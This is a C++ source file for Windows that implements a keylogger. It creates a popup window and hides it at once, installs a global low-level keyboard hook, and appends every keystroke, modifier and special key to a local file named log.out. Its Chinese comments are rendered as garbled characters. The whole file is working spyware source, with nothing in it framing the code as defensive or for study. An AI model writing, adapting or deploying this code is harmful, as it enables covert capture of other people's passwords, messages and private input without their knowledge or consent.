#define _WIN32_WINNT 0x0500
#include <fstream>
#include <windows.h>
#include <iostream>
using namespace std;
const char g_szClassName[] = "Record"; //������
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	WNDCLASSEX wc; 
	HWND hwnd;
	//���ھ��
	MSG Msg; 
	//��Ϣ�ṹ��
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;wc.lpszClassName = g_szClassName;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);RegisterClassEx(&wc);
	//ע�ᴰ����
	hwnd = CreateWindowEx(WS_POPUP| WS_EX_TOOLWINDOW,g_szClassName,"Record",WS_OVERLAPPEDWINDOW,CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,NULL, NULL, hInstance, NULL);ShowWindow(hwnd, SW_SHOW);
	//��ʾ���ڣ���ʵ�������Բ���ʾ����ν��������
	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);
	HHOOK keyboardHook = SetWindowsHookEx(
		//��װ����
		WH_KEYBOARD_LL,
		//���ǹ�ע����Ϣ�������й�ע�������м����¼�
		keyboardHookProc,
		//�����ӳ��򣬿������Ϊһ���ص���������ʵ��                                                                                              
		//�ǣ��������������ǹ�ע����Ϣ��ִ�����ڴ������̺���
		hInstance,0); 
	while (GetMessage(&Msg, NULL, 0, 0) > 0)
		//���ڳ����е���Ϣѭ��
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return Msg.wParam;
		return 0;
}

//�����ӳ��򣬼������������ǹ�ע�ļ�����Ϣ�������ҰѰ��µļ�ֵ��¼�ڡ�log.txt���ı���
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {

	ofstream out("./log.out", ios::out | ios::app);
	//���������¼��ֵ

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);if (wParam == WM_KEYDOWN) {

	//����������
	switch (p->vkCode) 
	{
		case VK_BACK: out << "<BK>"<<endl; break;
		case VK_TAB: out << "<TAB>"<<endl; break;
		case VK_CLEAR: out << "<CLEAR>"<<endl; break;
		case VK_RETURN: out << "<ENTER>"<<endl; break;
		case VK_SHIFT: out << "<SHIFT DOWN>"<<endl; break;
		case VK_CONTROL: out << "<CTRL DOWN>"<<endl; break;
		case VK_MENU: out << "<ALT DOWN>"<<endl; break;
		case VK_PAUSE: out << "<PAUSE>"<<endl; break;
		case VK_CAPITAL: out << "<CAPS LOCK>"<<endl; break;
		case VK_ESCAPE: out << "<ESC>"<<endl; break;
		case VK_SPACE: out << " "<<endl; break;
		case VK_PRIOR: out << "<PAGE UP>"<<endl; break;
		case VK_NEXT: out << "<PAGE DOWN>"<<endl; break;
		case VK_END: out << "<END>"<<endl; break;
		case VK_HOME: out << "<HOME>"<<endl; break;
		case VK_LEFT: out << "<LEFT ARROW>"<<endl; break;
		case VK_UP: out << "<UP ARROW>"<<endl; break;
		case VK_RIGHT: out << "<RIGHT ARROW>"<<endl; break;
		case VK_DOWN: out << "<DOWN ARROW>"<<endl; break;
		case VK_SELECT: out << "<SELECT>"<<endl; break;
		case VK_PRINT: out << "<PRINT>"<<endl; break;
		case VK_EXECUTE: out << "<EXECUTE>"<<endl; break;
		case VK_SNAPSHOT: out << "<PRINT SCREEN>"<<endl; break;
		case VK_INSERT: out << "<INSERT>"<<endl; break;
		case VK_DELETE: out << "<DEL>"<<endl; break;
		case VK_HELP: out << "<HELP>"<<endl; break;
		case VK_LWIN: out << "<Left Windows key DOWN>"<<endl; break;
		case VK_RWIN: out << "<Right Windows key DOWN>"<<endl; break;
		case VK_APPS: out << "<Applications key>"<<endl; break;
		case VK_SLEEP: out << "<Computer Sleep key>"<<endl; break;
		case VK_NUMPAD0: out << "0"<<endl; break;
		case VK_NUMPAD1: out << "1"<<endl; break;
		case VK_NUMPAD2: out << "2"<<endl; break;
		case VK_NUMPAD3: out << "3"<<endl; break;
		case VK_NUMPAD4: out << "4"<<endl; break;
		case VK_NUMPAD5: out << "5"<<endl; break;
		case VK_NUMPAD6: out << "6"<<endl; break;
		case VK_NUMPAD7: out << "7"<<endl; break;
		case VK_NUMPAD8: out << "8"<<endl; break;
		case VK_NUMPAD9: out << "9"<<endl; break;
		case VK_MULTIPLY: out << "*"<<endl; break;
		case VK_ADD: out << "+"<<endl; break;
		case VK_SEPARATOR: out << "<Separator key>"<<endl; break;
		case VK_SUBTRACT: out << "-"<<endl; break;
		case VK_DECIMAL: out << "."<<endl; break;
		case VK_DIVIDE: out << "/"<<endl; break;
		case VK_F1: out << "<F1>"<<endl; break;
		case VK_F2: out << "<F2>"<<endl; break;
		case VK_F3: out << "<F3>"<<endl; break;
		case VK_F4: out << "<F4>"<<endl; break;
		case VK_F5: out << "<F5>"<<endl; break;
		case VK_F6: out << "<F6>"<<endl; break;
		case VK_F7: out << "<F7>"<<endl; break;
		case VK_F8: out << "<F8>"<<endl; break;
		case VK_F9: out << "<F9>"<<endl; break;
		case VK_F10: out << "<F10>"<<endl; break;
		case VK_F11: out << "<F11>"<<endl; break;
		case VK_F12: out << "<F12>"<<endl; break;
		case VK_NUMLOCK: out << "<NUM LOCK>"<<endl; break;
		case VK_SCROLL: out << "<SCROLL LOCK>"<<endl; break;
		case VK_LSHIFT: out << "<Left SHIFT DOWN>"<<endl; break;
		case VK_RSHIFT: out << "<Right SHIFT DOWN>"<<endl; break;
		case VK_LCONTROL: out << "<Left CONTROL DOWN>"<<endl; break;
		case VK_RCONTROL: out << "<Right CONTROL DOWN>"<<endl; break;
		case VK_LMENU: out << "<Left MENU>"<<endl; break;
		case VK_RMENU: out << "<Right MENU>"<<endl; break;
		case VK_BROWSER_BACK: out << "<Browser Back key>"<<endl; break;
		case VK_BROWSER_FORWARD: out << "<Browser Forward key>"<<endl; break;
		case VK_BROWSER_REFRESH: out << "<Browser Refresh key>"<<endl; break;
		case VK_BROWSER_STOP: out << "<Browser Stop key>"<<endl; break;
		case VK_BROWSER_SEARCH: out << "<Browser Search key >"<<endl; break;
		case VK_BROWSER_FAVORITES: out << "<Browser Favorites key>"<<endl; break;
		case VK_BROWSER_HOME: out << "<Browser Start and Home key>"<<endl; break;
		case VK_VOLUME_MUTE: out << "<Volume Mute key>"<<endl; break;
		case VK_VOLUME_DOWN: out << "<Volume Down key>"<<endl; break;
		case VK_VOLUME_UP: out << "<Volume Up key>"<<endl; break;
		case VK_MEDIA_NEXT_TRACK: out << "<Next Track key>"<<endl; break;
		case VK_MEDIA_PREV_TRACK: out << "<Previous Track key>"<<endl; break;
		case VK_MEDIA_STOP: out << "<Stop Media key>"<<endl; break;
		case VK_MEDIA_PLAY_PAUSE: out << "<Play/Pause Media key>"<<endl; break;
		case VK_LAUNCH_MAIL: out << "<Start Mail key>"<<endl; break;
		case VK_LAUNCH_MEDIA_SELECT: out << "<Select Media key>"<<endl; break;
		case VK_LAUNCH_APP1: out << "<Start Application 1 key>"<<endl; break;
		case VK_LAUNCH_APP2: out << "<Start Application 2 key>"<<endl; break;
		case VK_OEM_1: out << "<;:' key >"<<endl; break;
		case VK_OEM_PLUS: out << "+"<<endl; break;
		case VK_OEM_COMMA: out << ","<<endl; break;
		case VK_OEM_MINUS: out << "-"<<endl; break;
		case VK_OEM_PERIOD: out << "."<<endl; break;
		case VK_OEM_2: out << "</?' key >"<<endl; break;
		case VK_OEM_3: out << "<`~' key >"<<endl; break;
		case VK_OEM_4: out << "<[{' key>"<<endl; break;
		case VK_OEM_5: out << "<\|' key>"<<endl; break;
		case VK_OEM_6: out << "<]}' key>"<<endl; break;
		case VK_OEM_7: out << "<single-quote/double-quote' key>"<<endl; break;
		case VK_OEM_CLEAR: out << "<Clear>"<<endl; break;
		default:out << char(tolower(p->vkCode)) ;
	}

}



	if (wParam == WM_KEYUP)
	{
		//�������ͷ�
		switch (p->vkCode)
		{	case VK_SHIFT: 
			out << "<SHIFT UP>" << endl; break; 
			case VK_CONTROL: 
				out << "<CTRL UP>" << endl; break; 
			case VK_MENU:
				out << "<ALT UP>" << endl; break; 
			case VK_LSHIFT: 
				out << "<Left SHIFT UP>" << endl; break; 
			case VK_RSHIFT: 
				out << "<Right SHIFT UP>" << endl; break;
			case VK_LCONTROL:
				out << "<Left CONTROL UP>" << endl; break; 
			case VK_RCONTROL:
				out << "<Right CONTROL UP>" << endl; break; 
			case VK_LWIN:
				out << "<Left Windows key UP>" << endl; break;
			case VK_RWIN:
				out << "<Right Windows key UP>" << endl; break; 
			default:goto a; a:;
		}
	}
	out.close();
		//�ر���
	return CallNextHookEx(NULL, nCode, wParam, lParam);
	//�������ǹ�ע����Ϣ��������һ�����Ӵ� 
	//��:CallNextHookEx(). ��������Ϊֻ��װһ�����ӣ����Ե��ø�
	//�����ǰ���Ϣ�������ڵ���Ϣ��������
	return 0;
}

//�������̺������ú��������ڵ���Ϣ������ִ��ʱ���ڹ��Ӻ���֮��
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) 
	{
		case WM_CLOSE:
			DestroyWindow(hwnd); break;
		case WM_DESTROY:
			PostQuitMessage(0); break; 
		default:
			return DefWindowProc(hwnd, msg, wParam, lParam);
		//���������������ڵ�Ĭ�ϴ�����}return 0;
	}
}

